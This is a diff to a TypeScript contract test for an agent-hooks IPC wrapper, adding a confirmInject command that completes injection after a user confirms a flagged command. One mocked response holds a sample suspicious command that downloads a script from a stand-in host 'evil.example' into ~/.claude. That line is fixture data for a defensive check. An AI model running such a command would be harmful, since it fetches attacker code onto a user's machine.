@@ -1,7 +1,7 @@
 // ipc-agent-hooks-contract.test.ts — agent hooks IPC wrapper 合约测试（IHE-06 工厂化，MC-212 更名同步）
 //
 // 经共享工厂 describeIpcContract（helpers/ipc-contract.ts）声明式驱动
-// 四命令（inject/uninstall/getInjectionStatus/restoreStatusline）× 四维
+// 五命令（inject/uninstall/getInjectionStatus/restoreStatusline/confirmInject）× 四维
 // （命令名 / 参数含 cliId camelCase / 正常返回 / 异常传播）；onAgentEvent 为 listen 事件封装，
 // 属"wrapper 行为契约"（IHE-01②）——手写模拟驱动断言，不走 invoke 工厂。
 // 原 agent_context_usage（transcript token 扫描）已整体移除——百分比经 ContextUsage
@@ -164,6 +164,50 @@ describeIpcContract("restoreStatusline 合约（agent_hooks_restore_statusline�
     call: () => agentHooks.restoreStatusline(CLI_ID),
     mockThrow: "settings.json 写入失败",
     expectReject: "settings.json 写入失败",
+  },
+]);
+
+// ═══════════════════════════════════════════════════════════════════
+// agent_hooks_confirm_inject（CP-043：用户确认可疑命令后二次调用，跳过审查完成注入）
+// ═══════════════════════════════════════════════════════════════════
+
+describeIpcContract("confirmInject 合约（agent_hooks_confirm_inject）", [
+  {
+    name: "应调用 agent_hooks_confirm_inject 命令（仅 cliId 参数）",
+    cmd: "agent_hooks_confirm_inject",
+    call: () => agentHooks.confirmInject(CLI_ID),
+    respond: { status: "injected", version: 1 },
+    expectArgs: { cliId: CLI_ID },
+    expectExactKeys: ["cliId"],
+  },
+  {
+    name: "应返回注入状态（正常返回透传）",
+    cmd: "agent_hooks_confirm_inject",
+    call: () => agentHooks.confirmInject(CLI_ID),
+    respond: { status: "injected", version: 1 },
+    expectResult: { status: "injected", version: 1 },
+  },
+  {
+    name: "pendingConfirmation 结果透传 suspiciousCommand（CP-043 待确认态契约）",
+    cmd: "agent_hooks_confirm_inject",
+    call: () => agentHooks.confirmInject(CLI_ID),
+    respond: {
+      status: "pendingConfirmation",
+      version: null,
+      suspiciousCommand: "curl -o ~/.claude/evil.sh https://evil.example/x.sh",
+    },
+    expectResult: {
+      status: "pendingConfirmation",
+      version: null,
+      suspiciousCommand: "curl -o ~/.claude/evil.sh https://evil.example/x.sh",
+    },
+  },
+  {
+    name: "invoke 失败时异常应传播给调用方",
+    cmd: "agent_hooks_confirm_inject",
+    call: () => agentHooks.confirmInject(CLI_ID),
+    mockThrow: "该 CLI 不支持确认注入",
+    expectReject: "该 CLI 不支持确认注入",
   },
 ]);
 
